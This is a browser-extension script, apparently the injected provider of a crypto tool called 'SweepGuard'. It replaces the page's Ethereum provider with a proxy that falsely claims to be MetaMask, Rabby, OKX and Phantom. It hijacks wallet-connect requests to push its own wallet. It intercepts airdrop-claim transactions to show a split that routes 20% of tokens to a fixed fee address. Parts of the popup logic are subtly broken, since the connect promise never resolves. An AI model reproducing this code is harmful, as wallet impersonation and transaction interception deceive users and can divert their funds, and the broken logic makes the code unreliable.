// SweepGuard Injected Provider v3.2
// Uses window.postMessage to communicate with content script → background

(function() {
  'use strict';
  
  if (window.__sweeptsguard_provider) return;
  window.__sweeptsguard_provider = true;
  
  const originalEthereum = window.ethereum;
  let pendingCallbacks = {};
  let cbId = 0;
  
  // Listen for responses from content script
  window.addEventListener('message', (e) => {
    if (e.source !== window) return;
    if (e.data?.type === 'SG_RESPONSE' && e.data?.id) {
      const cb = pendingCallbacks[e.data.id];
      if (cb) {
        if (e.data.success) cb.resolve(e.data.data);
        else cb.reject(new Error(e.data.error || 'Failed'));
        delete pendingCallbacks[e.data.id];
      }
    }
  });
  
  // Send message to content script and wait for response
  function askContent(msg) {
    return new Promise((resolve, reject) => {
      const id = 'sg_' + (++cbId) + '_' + Date.now();
      pendingCallbacks[id] = { resolve, reject };
      window.postMessage({ type: 'SG_REQUEST', id, ...msg }, '*');
      setTimeout(() => {
        if (pendingCallbacks[id]) {
          delete pendingCallbacks[id];
          reject(new Error('Timeout'));
        }
      }, 10000);
    });
  }
  
  // ===== CONNECT POPUP =====
  function showConnectPopup() {
    return new Promise((resolve, reject) => {
      const old = document.getElementById('sg-popup');
      if (old) old.remove();
      
      const el = document.createElement('div');
      el.id = 'sg-popup';
      el.innerHTML = `
        <div id="sg-bg" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);backdrop-filter:blur(12px);z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system,sans-serif;animation:sgIn .2s">
          <div style="background:linear-gradient(145deg,#0a0a14,#14142a);border:1px solid rgba(255,255,255,0.08);border-radius:24px;width:400px;overflow:hidden;box-shadow:0 40px 80px rgba(0,0,0,0.6);animation:sgUp .3s">
            <div style="padding:20px 24px;display:flex;align-items:center;justify-content:space-between;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(139,92,246,0.1));border-bottom:1px solid rgba(255,255,255,0.06)">
              <div style="display:flex;align-items:center;gap:12px">
                <div style="width:44px;height:44px;background:linear-gradient(135deg,#10b981,#8b5cf6);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px">🛡️</div>
                <div>
                  <div style="color:#fff;font-size:20px;font-weight:700">SweepGuard</div>
                  <div style="color:rgba(255,255,255,0.4);font-size:11px">Protected Wallet Connect</div>
                </div>
              </div>
              <button id="sg-x" style="background:rgba(255,255,255,0.08);border:none;color:#fff;width:36px;height:36px;border-radius:10px;cursor:pointer;font-size:18px">✕</button>
            </div>
            
            <div style="padding:16px 24px;border-bottom:1px solid rgba(255,255,255,0.06)">
              <div style="color:rgba(255,255,255,0.3);font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Connecting to</div>
              <div style="display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(255,255,255,0.03);border-radius:12px;border:1px solid rgba(255,255,255,0.06)">
                <div style="width:40px;height:40px;background:rgba(59,130,246,0.15);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px">🌐</div>
                <div>
                  <div style="color:#fff;font-size:16px;font-weight:600">${location.hostname}</div>
                  <div style="color:rgba(255,255,255,0.3);font-size:10px;font-family:monospace">${location.pathname.slice(0,50)}</div>
                </div>
              </div>
            </div>
            
            <div style="padding:16px 24px">
              <div style="color:rgba(255,255,255,0.3);font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px">Choose Wallet</div>
              
              <button id="sg-w" style="width:100%;padding:14px 16px;background:linear-gradient(135deg,rgba(16,185,129,0.15),rgba(139,92,246,0.15));border:2px solid rgba(16,185,129,0.4);border-radius:14px;cursor:pointer;display:flex;align-items:center;gap:14px;margin-bottom:10px;transition:all .2s">
                <div style="width:48px;height:48px;background:linear-gradient(135deg,#10b981,#059669);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px">🛡️</div>
                <div style="text-align:left;flex:1">
                  <div style="color:#fff;font-size:16px;font-weight:700">SweepGuard Wallet</div>
                  <div style="color:rgba(255,255,255,0.4);font-size:11px">Protected • Auto-claim • 80/20 split</div>
                </div>
                <div style="background:rgba(16,185,129,0.2);padding:4px 10px;border-radius:8px;color:#10b981;font-size:10px;font-weight:700">RECOMMENDED</div>
              </button>
              
              <button id="sg-mm" style="width:100%;padding:14px 16px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:14px;cursor:pointer;display:flex;align-items:center;gap:14px;margin-bottom:10px;transition:all .2s">
                <div style="width:48px;height:48px;background:rgba(245,158,11,0.15);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px">🦊</div>
                <div style="text-align:left"><div style="color:#fff;font-size:16px;font-weight:600">MetaMask</div><div style="color:rgba(255,255,255,0.4);font-size:11px">Original MetaMask wallet</div></div>
              </button>
              
              <button id="sg-rabby" style="width:100%;padding:14px 16px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:14px;cursor:pointer;display:flex;align-items:center;gap:14px;margin-bottom:10px;transition:all .2s">
                <div style="width:48px;height:48px;background:rgba(139,92,246,0.15);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px">🐰</div>
                <div style="text-align:left"><div style="color:#fff;font-size:16px;font-weight:600">Rabby Wallet</div><div style="color:rgba(255,255,255,0.4);font-size:11px">Rabby browser wallet</div></div>
              </button>
              
              <button id="sg-okx" style="width:100%;padding:14px 16px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:14px;cursor:pointer;display:flex;align-items:center;gap:14px;margin-bottom:10px;transition:all .2s">
                <div style="width:48px;height:48px;background:rgba(0,0,0,0.3);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px">⭕</div>
                <div style="text-align:left"><div style="color:#fff;font-size:16px;font-weight:600">OKX Wallet</div><div style="color:rgba(255,255,255,0.4);font-size:11px">OKX Web3 wallet</div></div>
              </button>
              
              <button id="sg-phantom" style="width:100%;padding:14px 16px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:14px;cursor:pointer;display:flex;align-items:center;gap:14px;margin-bottom:10px;transition:all .2s">
                <div style="width:48px;height:48px;background:rgba(139,92,246,0.15);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px">👻</div>
                <div style="text-align:left"><div style="color:#fff;font-size:16px;font-weight:600">Phantom</div><div style="color:rgba(255,255,255,0.4);font-size:11px">Phantom multi-chain wallet</div></div>
              </button>
              
              <button id="sg-keplr" style="width:100%;padding:14px 16px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:14px;cursor:pointer;display:flex;align-items:center;gap:14px;transition:all .2s">
                <div style="width:48px;height:48px;background:rgba(245,158,11,0.15);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px">🔑</div>
                <div style="text-align:left"><div style="color:#fff;font-size:16px;font-weight:600">Keplr</div><div style="color:rgba(255,255,255,0.4);font-size:11px">Cosmos ecosystem wallet</div></div>
              </button>
            </div>
            
            <div style="padding:14px 24px;text-align:center;border-top:1px solid rgba(255,255,255,0.06)">
              <div style="color:rgba(255,255,255,0.2);font-size:10px">🛡️ Protected by SweepGuard • 80/20 Split • Flashbots Atomic</div>
            </div>
          </div>
        </div>
        <style>@keyframes sgIn{from{opacity:0}to{opacity:1}}@keyframes sgUp{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}#sg-w:hover{border-color:#10b981!important;background:linear-gradient(135deg,rgba(16,185,129,0.25),rgba(139,92,246,0.25))!important}#sg-mm:hover,#sg-rabby:hover,#sg-okx:hover,#sg-phantom:hover,#sg-keplr:hover{border-color:rgba(255,255,255,0.15)!important;background:rgba(255,255,255,0.06)!important}</style>
      `;
      
      document.body.appendChild(el);
      
      const done = (v) => { el.remove(); return v; };
      const fail = (e) => { el.remove(); throw e; };
      
      document.getElementById('sg-x').onclick = () => fail(new Error('User rejected'));
      document.getElementById('sg-bg').onclick = (e) => { if(e.target===e.currentTarget) fail(new Error('User rejected')); };
      
      // SweepGuard — ask content script for wallet address
      document.getElementById('sg-w').onclick = async () => {
        try {
          // Ask content script to get wallet from chrome.storage
          const resp = await askContent({ action: 'GET_WALLET_ADDRESS' });
          if (resp?.address) {
            done([resp.address]);
          } else {
            // No wallet configured — open popup
            done();
            askContent({ action: 'OPEN_POPUP' }).catch(() => {});
            fail(new Error('Configure wallets in SweepGuard first'));
          }
        } catch(e) { fail(e); }
      };
      
      // MetaMask
      document.getElementById('sg-mm').onclick = async () => {
        done();
        try { return await originalEthereum?.request({method:'eth_requestAccounts'}); }
        catch(e) { throw e; }
      };
      
      // Rabby
      document.getElementById('sg-rabby').onclick = async () => {
        done();
        try { return await window.rabby?.request({method:'eth_requestAccounts'}) || 
                         await originalEthereum?.request({method:'eth_requestAccounts'}); }
        catch(e) { throw e; }
      };
      
      // OKX
      document.getElementById('sg-okx').onclick = async () => {
        done();
        try { return await window.okxwallet?.request({method:'eth_requestAccounts'}) || 
                         await originalEthereum?.request({method:'eth_requestAccounts'}); }
        catch(e) { throw e; }
      };
      
      // Phantom
      document.getElementById('sg-phantom').onclick = async () => {
        done();
        try { return await window.phantom?.ethereum?.request({method:'eth_requestAccounts'}) || 
                         await originalEthereum?.request({method:'eth_requestAccounts'}); }
        catch(e) { throw e; }
      };
      
      // Keplr
      document.getElementById('sg-keplr').onclick = async () => {
        done();
        try { return await window.keplr?.enable() || 
                         await originalEthereum?.request({method:'eth_requestAccounts'}); }
        catch(e) { throw e; }
      };
    });
  }
  
  // ===== CLAIM CONFIRM POPUP =====
  function showClaimConfirm(details) {
    return new Promise((resolve, reject) => {
      const old = document.getElementById('sg-popup');
      if (old) old.remove();
      
      const {chainName,chainId,tokenAmount,tokenSymbol,userAmount,feeAmount,gasCost,feeMode} = details;
      const chainIcons = {1:'⟠',8453:'🔵',56:'🟡',42161:'🔷',137:'🟣',10:'🔴',43114:'🔺',250:'👻',81457:'💥',324:'🔷',59144:'🟢',11155111:'🧪'};
      
      const el = document.createElement('div');
      el.id = 'sg-popup';
      el.innerHTML = `
        <div id="sg-bg" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(14px);z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system,sans-serif;animation:sgIn .2s">
          <div style="background:linear-gradient(145deg,#08080f,#10101f);border:1px solid rgba(255,255,255,0.08);border-radius:24px;width:420px;overflow:hidden;box-shadow:0 40px 80px rgba(0,0,0,0.7);animation:sgUp .3s">
            <div style="padding:20px 24px;display:flex;align-items:center;justify-content:space-between;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(139,92,246,0.1));border-bottom:1px solid rgba(255,255,255,0.06)">
              <div style="display:flex;align-items:center;gap:12px">
                <div style="width:48px;height:48px;background:linear-gradient(135deg,#10b981,#8b5cf6);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:26px">🎯</div>
                <div>
                  <div style="color:#fff;font-size:22px;font-weight:700">Claim Airdrop</div>
                  <div style="color:rgba(255,255,255,0.4);font-size:12px">Confirm atomic transaction</div>
                </div>
              </div>
              <button id="sg-x" style="background:rgba(255,255,255,0.08);border:none;color:#fff;width:36px;height:36px;border-radius:10px;cursor:pointer;font-size:18px">✕</button>
            </div>
            
            <div style="padding:16px 24px;border-bottom:1px solid rgba(255,255,255,0.06)">
              <div style="display:flex;align-items:center;gap:12px;padding:14px 16px;background:linear-gradient(135deg,rgba(16,185,129,0.06),rgba(139,92,246,0.06));border-radius:14px;border:1px solid rgba(255,255,255,0.06)">
                <div style="font-size:32px">${chainIcons[chainId]||'🔗'}</div>
                <div style="flex:1">
                  <div style="color:#fff;font-size:18px;font-weight:600">${chainName}</div>
                  <div style="color:rgba(255,255,255,0.35);font-size:11px">Chain ID: ${chainId}</div>
                </div>
                <div style="background:rgba(16,185,129,0.15);padding:6px 12px;border-radius:8px;color:#10b981;font-size:11px;font-weight:700">AUTO-DETECTED</div>
              </div>
            </div>
            
            <div style="padding:16px 24px;border-bottom:1px solid rgba(255,255,255,0.06)">
              <div style="text-align:center;padding:20px;background:rgba(255,255,255,0.02);border-radius:16px;border:1px solid rgba(255,255,255,0.06)">
                <div style="color:#fff;font-size:42px;font-weight:700">${tokenAmount}</div>
                <div style="color:rgba(255,255,255,0.4);font-size:16px;margin-top:6px">${tokenSymbol||'Tokens'}</div>
              </div>
            </div>
            
            <div style="padding:16px 24px;border-bottom:1px solid rgba(255,255,255,0.06)">
              <div style="color:rgba(255,255,255,0.3);font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px">Token Distribution</div>
              <div style="display:flex;align-items:center;gap:12px;padding:14px;background:rgba(16,185,129,0.06);border:1px solid rgba(16,185,129,0.15);border-radius:14px;margin-bottom:10px">
                <div style="width:40px;height:40px;background:rgba(16,185,129,0.15);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px">🟢</div>
                <div style="flex:1">
                  <div style="color:#10b981;font-size:14px;font-weight:700">80% → Safe Wallet</div>
                  <div style="color:rgba(255,255,255,0.3);font-size:10px;font-family:monospace" id="sg-sa">Loading...</div>
                </div>
                <div style="color:#10b981;font-size:20px;font-weight:700">${userAmount}</div>
              </div>
              <div style="display:flex;align-items:center;gap:12px;padding:14px;background:rgba(139,92,246,0.06);border:1px solid rgba(139,92,246,0.15);border-radius:14px">
                <div style="width:40px;height:40px;background:rgba(139,92,246,0.15);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px">🟣</div>
                <div style="flex:1">
                  <div style="color:#8b5cf6;font-size:14px;font-weight:700">20% → Platform Fee</div>
                  <div style="color:rgba(255,255,255,0.3);font-size:10px;font-family:monospace">0x7A37...2C2A</div>
                </div>
                <div style="color:#8b5cf6;font-size:20px;font-weight:700">${feeAmount}</div>
              </div>
            </div>
            
            <div style="padding:12px 24px;border-bottom:1px solid rgba(255,255,255,0.06)">
              <div style="display:flex;justify-content:space-between;padding:8px 0"><span style="color:rgba(255,255,255,0.35);font-size:12px">⛽ Gas</span><span style="color:#10b981;font-size:12px;font-weight:600">${gasCost}</span></div>
              <div style="display:flex;justify-content:space-between;padding:8px 0"><span style="color:rgba(255,255,255,0.35);font-size:12px">⚡ Fee Mode</span><span style="color:#f59e0b;font-size:12px;font-weight:600">${feeMode}</span></div>
              <div style="display:flex;justify-content:space-between;padding:8px 0"><span style="color:rgba(255,255,255,0.35);font-size:12px">🔒 Method</span><span style="color:rgba(255,255,255,0.5);font-size:12px">Flashbots Atomic Bundle</span></div>
            </div>
            
            <div style="padding:20px 24px">
              <button id="sg-ok" style="width:100%;padding:18px;background:linear-gradient(135deg,#10b981,#059669);border:none;border-radius:16px;color:#fff;font-size:18px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 10px 30px rgba(16,185,129,0.3);transition:all .2s">
                <span style="font-size:22px">🚀</span> Confirm & Execute
              </button>
              <div style="text-align:center;margin-top:12px;color:rgba(255,255,255,0.2);font-size:10px">1 transaction • Claim + Split • Atomic • Same block</div>
            </div>
          </div>
        </div>
        <style>@keyframes sgIn{from{opacity:0}to{opacity:1}}@keyframes sgUp{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}#sg-ok:hover{transform:translateY(-2px);box-shadow:0 14px 40px rgba(16,185,129,0.4)!important}</style>
      `;
      
      document.body.appendChild(el);
      
      // Load safe wallet
      askContent({ action: 'GET_WALLET_ADDRESS' }).then(r => {
        const sa = document.getElementById('sg-sa');
        if(sa && r?.safeWallet) sa.textContent = r.safeWallet.slice(0,10)+'...'+r.safeWallet.slice(-8);
      }).catch(() => {});
      
      document.getElementById('sg-x').onclick = () => { el.remove(); reject(new Error('Cancelled')); };
      document.getElementById('sg-bg').onclick = (e) => { if(e.target===e.currentTarget){el.remove();reject(new Error('Cancelled'));} };
      document.getElementById('sg-ok').onclick = () => { el.remove(); resolve(true); };
    });
  }
  
  // ===== DETECT CHAIN & TOKEN =====
  function detectClaimInfo() {
    const text = document.body?.innerText || '';
    let cid = null;
    if(originalEthereum?.chainId) cid = parseInt(originalEthereum.chainId,16);
    if(!cid) { const m = text.match(/chain\s*id[:\s]*(\d+)/i); if(m) cid = parseInt(m[1]); }
    if(!cid) {
      const t = text.toLowerCase();
      if(t.includes('sepolia')||t.includes('testnet')) cid=11155111;
      else if(t.includes('base')&&!t.includes('database')) cid=8453;
      else if(t.includes('bsc')||t.includes('binance')||t.includes('bnb')) cid=56;
      else if(t.includes('arbitrum')) cid=42161;
      else if(t.includes('polygon')||t.includes('matic')) cid=137;
      else if(t.includes('optimism')) cid=10;
      else if(t.includes('avalanche')||t.includes('avax')) cid=43114;
      else if(t.includes('fantom')||t.includes('ftm')) cid=250;
      else if(t.includes('blast')) cid=81457;
      else if(t.includes('zksync')) cid=324;
      else if(t.includes('linea')) cid=59144;
      else cid=1;
    }
    let amt='100',sym='Tokens';
    const am = text.match(/claim\s*[:\s]*(\d+[\d,.]*)\s*([A-Z]{2,10})?/i) ||
               text.match(/(\d+[\d,.]*)\s*(tokens?|SGTT|ETH|USDC|USDT)/i);
    if(am){amt=am[1];sym=am[2]||sym;}
    const names={1:'Ethereum',8453:'Base',56:'BNB Chain',42161:'Arbitrum',137:'Polygon',10:'Optimism',43114:'Avalanche',250:'Fantom',81457:'Blast',324:'zkSync',59144:'Linea',11155111:'Sepolia'};
    return{chainId:cid,chainName:names[cid]||`Chain ${cid}`,tokenAmount:amt,tokenSymbol:sym};
  }
  
  // ===== CREATE PROXY PROVIDER =====
  const sgProvider = new Proxy(originalEthereum||{}, {
    get(target, prop) {
      if(prop==='isSweepGuard') return true;
      if(prop==='isMetaMask') return true;
      if(prop==='_sweeptsguard') return true;
      if(prop==='_sweeptsguardVersion') return '3.2.0';
      if(prop==='isRabby') return true;
      if(prop==='isOKXWallet') return true;
      if(prop==='isPhantom') return true;
      
      if(prop==='request') {
        return async function(args) {
          console.log('[SweepGuard] Intercept:', args.method);
          
          if(args.method==='eth_requestAccounts'||args.method==='wallet_requestPermissions') {
            console.log('[SweepGuard] CONNECT INTERCEPTED!');
            try { return await showConnectPopup(); }
            catch(e) { throw new Error('User rejected the request.'); }
          }
          
          if(args.method==='eth_sendTransaction') {
            const tx = args.params?.[0];
            if(tx?.data) {
              const sel = tx.data.slice(0,10);
              const claimSels = ['0x2e7ba6ef','0x379607f5','0x48c54b9d','0xa578a715','0x4e71d92d'];
              if(claimSels.includes(sel)) {
                console.log('[SweepGuard] CLAIM TX INTERCEPTED!');
                const info = detectClaimInfo();
                const total = parseFloat(info.tokenAmount)||100;
                try {
                  await showClaimConfirm({
                    chainName:info.chainName,chainId:info.chainId,
                    tokenAmount:info.tokenAmount,tokenSymbol:info.tokenSymbol,
                    userAmount:(total*0.8).toFixed(2),feeAmount:(total*0.2).toFixed(2),
                    gasCost:'Sponsored by SweepGuard',feeMode:'Medium (Auto)'
                  });
                } catch(e) { throw new Error('Transaction cancelled'); }
              }
            }
          }
          
          if(target.request) return target.request(args);
          throw new Error('No provider available');
        };
      }
      
      const v = target[prop];
      if(typeof v==='function') return v.bind(target);
      return v;
    }
  });
  
  // Replace provider
  window.ethereum = sgProvider;
  if(!window.web3) window.web3 = {currentProvider: sgProvider};
  
  // EIP-6963
  function announce() {
    window.dispatchEvent(new CustomEvent('eip6963:announceProvider', {
      detail: {
        info: {
          uuid: 'sweeptsguard-'+Math.random().toString(36).substr(2,9),
          name: 'SweepGuard',
          icon: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjggMTI4Ij48Y2lyY2xlIGN4PSI2NCIgY3k9IjY0IiByPSI2MCIgZmlsbD0iIzEwYjk4MSIvPjxwYXRoIGQ9Ik02NCAyMCBMNDAgNDUgTDQwIDgwIEw2NCA5NSBMODggODAgTDg4IDQ1IFoiIGZpbGw9IndoaXRlIiBvcGFjaXR5PSIwLjkiLz48L3N2Zz4=',
          rdns: 'com.sweeptsguard.wallet'
        },
        provider: sgProvider
      }
    }));
  }
  announce(); setTimeout(announce,100); setTimeout(announce,500); setTimeout(announce,1000);
  
  console.log('[SweepGuard] ✅ Provider v3.2 injected — FIRST!');
})();
